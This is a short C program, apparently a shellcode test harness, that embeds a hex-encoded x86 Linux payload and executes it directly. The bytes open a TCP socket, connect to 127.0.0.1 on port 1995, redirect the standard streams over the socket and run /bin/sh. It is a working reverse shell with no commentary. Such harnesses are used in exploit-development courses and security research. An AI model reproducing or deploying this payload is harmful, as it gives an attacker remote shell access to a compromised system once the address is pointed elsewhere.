#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\x31\xf6\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x5b\x43\x5f\x68\x7f\x00\x00\x01\x66\x68\x07\xcb\x66\x6a\x02\x6a\x10\x51\x56\x89\xe1\xcd\x80\x87\xf3\x31\xc9\x80\xc1\x02\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";




main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
